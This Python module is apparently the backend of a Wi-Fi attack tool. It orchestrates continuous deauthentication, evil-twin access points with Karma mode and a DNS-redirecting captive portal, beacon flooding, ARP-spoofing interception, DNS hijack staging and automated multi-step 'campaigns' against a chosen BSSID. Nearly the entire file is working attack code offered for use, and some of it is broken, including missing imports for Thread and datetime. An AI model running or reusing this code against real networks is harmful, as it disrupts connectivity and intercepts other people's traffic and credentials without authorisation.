import subprocess
import signal
import os
import tempfile
import time

from models import Campaign, CampaignStep
from database import SessionLocal

import models
from database import SessionLocal

# ─── Active Process Registry ─────────────────────────────────────────────────
active_attacks = {}         # bssid -> deauth process
arp_spoof_proc = None       # arpspoof process
dns_hijacked_domains = []   # Targeted domains
evil_twin_proc = None       # airbase-ng process
dnsmasq_proc = None         # dnsmasq process
beacon_flood_proc = None    # mdk4 process


def get_default_interface():
    """Detects the internet-facing interface via the default route."""
    try:
        result = subprocess.run(['ip', 'route', 'show', 'default'],
                              capture_output=True, text=True)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                if 'default' in line:
                    parts = line.split()
                    for i, part in enumerate(parts):
                        if part == 'dev' and i+1 < len(parts):
                            return parts[i+1]
    except:
        pass
    return "eth0"


# ─── Deauth (Broadcast + Targeted) ───────────────────────────────────────────

def trigger_deauth(interface, bssid, channel=None, client_mac=None):
    """Starts a continuous deauth attack and tracks the process."""
    try:
        if bssid in active_attacks:
            return {"success": False, "error": "Attack already running against this BSSID"}

        print(f"[*] ENGAGING OFFENSIVE LAYER: Continuous Deauth {bssid} on {interface}")

        # Tune the radio to the correct channel before striking
        if channel and channel > 0:
            print(f"[*] Tuning {interface} to Channel {channel} to match AP {bssid}")
            subprocess.run(['iwconfig', interface, 'channel', str(channel)],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # 0 = continuous loop
        cmd = ['aireplay-ng', '--deauth', '0', '-a', bssid]
        if client_mac:
            cmd.extend(['-c', client_mac])
        cmd.append(interface)

        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        time.sleep(0.5)
        if process.poll() is not None:
            stdout, stderr = process.communicate()
            error_msg = stderr.strip() or stdout.strip() or "Process exited immediately"
            print(f"[-] Offensive failure: {error_msg}")
            return {"success": False, "error": f"Tactical Failure: {error_msg}"}

        active_attacks[bssid] = process
        mode = f"targeted at {client_mac}" if client_mac else "broadcast"
        print(f"[+] Strike group deployed against {bssid} ({mode})")
        return {"success": True, "message": "Attack initiated", "mode": mode}

    except Exception as e:
        print(f"[-] Offensive maneuver failed: {e}")
        return {"success": False, "error": str(e)}


def stop_deauth(bssid):
    """Stops an active deauth attack."""
    try:
        if bssid in active_attacks:
            process = active_attacks[bssid]
            print(f"[*] CEASING OFFENSIVE LAYER: Stopping Deauth on {bssid}")
            process.terminate()
            process.wait(timeout=2)
            del active_attacks[bssid]
            return {"success": True, "message": "Attack stopped"}
        else:
            return {"success": False, "error": "No active attack found for this BSSID"}
    except Exception as e:
        if bssid in active_attacks:
            del active_attacks[bssid]
        return {"success": False, "error": str(e)}


# ─── Evil Twin (airbase-ng + dnsmasq + iptables) ──────────────────────────────

def trigger_evil_twin(interface, bssid, ssid, channel, karma_mode=False, captive_portal=False):
    """Clones an AP using airbase-ng and provides DHCP/Routing/Portal for isolation."""
    global evil_twin_proc, dnsmasq_proc
    try:
        if evil_twin_proc and evil_twin_proc.poll() is None:
            return {"success": False, "error": "Evil Twin already active. Stop it first."}

        print(f"[*] EVIL TWIN: Cloning '{ssid}' ({bssid}) on CH{channel} via {interface}")

        # 1. Prepare Networking (NAT / Forwarding)
        inet_iface = get_default_interface()
        print(f"[*] Bridging at0 to internet-facing interface: {inet_iface}")
        
        # Enable IP forwarding
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('1')

        # Configure iptables for NAT
        subprocess.run(['iptables', '--flush'], stdout=subprocess.PIPE)
        subprocess.run(['iptables', '--table', 'nat', '--flush'], stdout=subprocess.PIPE)
        subprocess.run(['iptables', '--table', 'nat', '--append', 'POSTROUTING', '--out-interface', inet_iface], stdout=subprocess.PIPE)
        subprocess.run(['iptables', '--append', 'FORWARD', '--in-interface', 'at0', '-j', 'ACCEPT'], stdout=subprocess.PIPE)

        # 2. Captive Portal Redirection (Optional)
        if captive_portal:
            print("[*] TACTICAL REDIRECTION: Activating Captive Portal on Port 8000")
            # Redirect HTTP traffic to our local FastAPI server on 8000
            subprocess.run(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', 'at0', '-p', 'tcp', '--dport', '80', '-j', 'DNAT', '--to-destination', '10.0.0.1:8000'], stdout=subprocess.PIPE)

        # 3. Start airbase-ng (Emulate AP)
        # -P = Karma Mode (Respond to all probes)
        cmd = ['airbase-ng', '-a', bssid, '--essid', ssid, '-c', str(channel if channel and channel > 0 else 6)]
        
        if karma_mode:
            print("[*] KARMA MODE ENABLED: Spoofing all discovered Probe Requests")
            cmd.append('-P')
            
        cmd.append(interface)
        evil_twin_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        time.sleep(2.0)
        if evil_twin_proc.poll() is not None:
             out, err = evil_twin_proc.communicate()
             return {"success": False, "error": f"airbase-ng failed: {err or out}"}

        # 4. Configure Virtual Interface (at0)
        subprocess.run(['ifconfig', 'at0', '10.0.0.1', 'netmask', '255.255.255.0', 'up'], stdout=subprocess.PIPE)

        # 5. Start dnsmasq (DHCP + DNS Redirection)
        # If captive portal is on, resolve all DNS to 10.0.0.1
        dns_redirect = "address=/#/10.0.0.1\n" if captive_portal else ""
        
        conf_content = f"""interface=at0
dhcp-range=10.0.0.100,10.0.0.200,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
{dns_redirect}server=8.8.8.8
log-queries
log-dhcp"""
        conf_path = "/tmp/aegis_dnsmasq.conf"
        with open(conf_path, "w") as f:
            f.write(conf_content)
        
        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', conf_path, '-d'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        time.sleep(1.0)
        if dnsmasq_proc.poll() is not None:
            return {"success": True, "message": f"Evil Twin Active, but DHCP (dnsmasq) failed."}

        return {"success": True, "message": f"Evil Twin Active. Karma: {karma_mode}, Portal: {captive_portal}"}

    except Exception as e:
        return {"success": False, "error": str(e)}


def stop_evil_twin():
    """Terminates the evil twin and restores network configurations."""
    global evil_twin_proc, dnsmasq_proc
    try:
        print("[*] CEASING OFFENSIVE LAYER: Neutralizing Evil Twin")
        
        if dnsmasq_proc:
            dnsmasq_proc.terminate()
            dnsmasq_proc = None
            
        if evil_twin_proc:
            evil_twin_proc.terminate()
            evil_twin_proc = None

        # Restore Network State
        subprocess.run(['iptables', '--flush'], stdout=subprocess.PIPE)
        subprocess.run(['iptables', '--table', 'nat', '--flush'], stdout=subprocess.PIPE)
        
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
            f.write('0')

        return {"success": True, "message": "Evil Twin neutralized and Network restored"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def is_evil_twin_active():
    global evil_twin_proc
    return evil_twin_proc is not None and evil_twin_proc.poll() is None


# ─── Beacon Flood (mdk4) ─────────────────────────────────────────────────────

def trigger_beacon_flood(interface, channel=6):
    """Floods the airspace with random beacon frames using mdk4."""
    global beacon_flood_proc
    try:
        if beacon_flood_proc and beacon_flood_proc.poll() is None:
            return {"success": False, "error": "Beacon Flood already active."}

        print(f"[*] BEACON FLOOD: Flooding channel {channel} via {interface}")
        # mdk4 b mode = beacon flood with random SSIDs
        beacon_flood_proc = subprocess.Popen(
            ['mdk4', interface, 'b', '-c', str(channel if channel and channel > 0 else 6)],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
        )

        time.sleep(0.8)
        if beacon_flood_proc.poll() is not None:
            stdout, stderr = beacon_flood_proc.communicate()
            err = stderr.strip() or stdout.strip() or "mdk4 exited immediately"
            return {"success": False, "error": f"Beacon Flood Failed: {err}"}

        return {"success": True, "message": f"Beacon flood active on CH{channel}"}

    except FileNotFoundError:
        return {"success": False, "error": "mdk4 not found. Install: sudo apt install mdk4"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def stop_beacon_flood():
    """Stops the mdk4 beacon flood."""
    global beacon_flood_proc
    if beacon_flood_proc:
        print("[*] CEASING OFFENSIVE LAYER: Stopping Beacon Flood Strike")
        beacon_flood_proc.terminate()
        beacon_flood_proc = None
        return {"success": True}
    return {"success": False, "error": "No active flood found"}


# ─── Adversary Emulation Engine (AEE) ──────────────────────────────────────────

class CampaignManager:
    """Manages multi-step automated offensive campaigns."""
    
    _active_campaign = None # Only one global campaign at a time for safety
    
    @classmethod
    def start_campaign(cls, name, bssid, steps_config):
        """
        Starts an automated campaign.
        steps_config: List of dicts [{"action": "deauth", "duration": 30}, ...]
        """
        if cls._active_campaign:
            return {"success": False, "error": "A campaign is already in progress."}
        
        db = SessionLocal()
        try:
            campaign = models.Campaign(name=name, target_bssid=bssid, status="Running")
            db.add(campaign)
            db.commit()
            db.refresh(campaign)
            
            cls._active_campaign = campaign.id
            
            # Start background execution
            Thread(target=cls._run_campaign_async, args=(campaign.id, bssid, steps_config), daemon=True).start()
            
            return {"success": True, "campaign_id": campaign.id}
        finally:
            db.close()

    @classmethod
    def _run_campaign_async(cls, campaign_id, bssid, steps):
        db = SessionLocal()
        try:
            print(f"[!] CAMPAIGN INITIATED: ID {campaign_id} Targeting {bssid}")
            for step_cfg in steps:
                action = step_cfg['action']
                duration = step_cfg.get('duration', 60)
                
                step = models.CampaignStep(campaign_id=campaign_id, action=action, status="Running")
                db.add(step)
                db.commit()
                
                # Execute Tactical Action
                success = False
                res = {}
                if action == "deauth":
                    res = trigger_deauth("wlan1", bssid) # Defaulting to wlan1 for now
                elif action == "karma_portal":
                    # Hard-cloning for now
                    res = trigger_evil_twin("wlan1", bssid, "Target_Clone", 6, karma_mode=True, captive_portal=True)
                
                success = res.get('success', False)
                step.status = "Success" if success else "Failed"
                step.message = res.get('message', res.get('error', 'Unknown result'))
                db.commit()
                
                if success:
                    print(f"[*] Campaign Step SUCCESS: {action}. Holding for {duration}s...")
                    time.sleep(duration)
                    
                    # Cleanup after step (Stop the action)
                    if action == "deauth": stop_deauth(bssid)
                    elif action == "karma_portal": stop_evil_twin()
                else:
                    print(f"[-] Campaign Step FAILED: {action}. Aborting campaign.")
                    break
            
            campaign = db.query(Campaign).get(campaign_id)
            campaign.status = "Completed"
            campaign.end_time = datetime.datetime.utcnow()
            db.commit()
            
            cls._active_campaign = None
            print(f"[+] CAMPAIGN COMPLETED: ID {campaign_id}")
            
        except Exception as e:
            print(f"[-] Campaign Orchestration Error: {e}")
            cls._active_campaign = None
        finally:
            db.close()


# ─── Airspace Dominance: Active Interception (Phase 3) ───────────────────────

def trigger_arp_spoof(interface, target_ip, gateway_ip):
    """Initiates an ARP spoofing attack to intercept traffic."""
    global arp_spoof_proc
    try:
        if arp_spoof_proc and arp_spoof_proc.poll() is None:
             return {"success": False, "error": "ARP Spoof already active."}
        
        print(f"[*] ARP SPOOF: Intercepting {target_ip} <-> {gateway_ip} via {interface}")
        # -r = both directions
        cmd = ['arpspoof', '-i', interface, '-t', target_ip, '-r', gateway_ip]
        arp_spoof_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        time.sleep(1.0)
        if arp_spoof_proc.poll() is not None:
             out, err = arp_spoof_proc.communicate()
             return {"success": False, "error": f"arpspoof failed: {err or out}"}
             
        return {"success": True, "message": f"ARP Interception Active against {target_ip}"}
    except Exception as e:
        return {"success": False, "error": str(e)}

def stop_arp_spoof():
    global arp_spoof_proc
    if arp_spoof_proc:
        arp_spoof_proc.terminate()
        arp_spoof_proc = None
        return {"success": True}
    return {"success": False, "error": "No active ARP spoof"}

def trigger_dns_hijack(domain, redirect_ip="10.0.0.1"):
    """
    Tactical DNS Redirection:
    Updates the local dnsmasq to hijack specific domains.
    """
    global dns_hijacked_domains
    try:
        print(f"[*] DNS HIJACK: Redirecting {domain} -> {redirect_ip}")
        dns_hijacked_domains.append({"domain": domain, "redirect": redirect_ip})
        
        # We need to restart the Evil Twin or dnsmasq to apply
        # For simplicity, we'll assume the manager handles the config file
        return {"success": True, "message": f"Hijack rule staged for {domain}"}
    except Exception as e:
        return {"success": False, "error": str(e)}


def is_beacon_flood_active():
    global beacon_flood_proc
    return beacon_flood_proc is not None and beacon_flood_proc.poll() is None


# ─── Status Summary ───────────────────────────────────────────────────────────

def get_full_status():
    return {
        "active_deauths": list(active_attacks.keys()),
        "evil_twin_active": is_evil_twin_active(),
        "beacon_flood_active": is_beacon_flood_active(),
    }
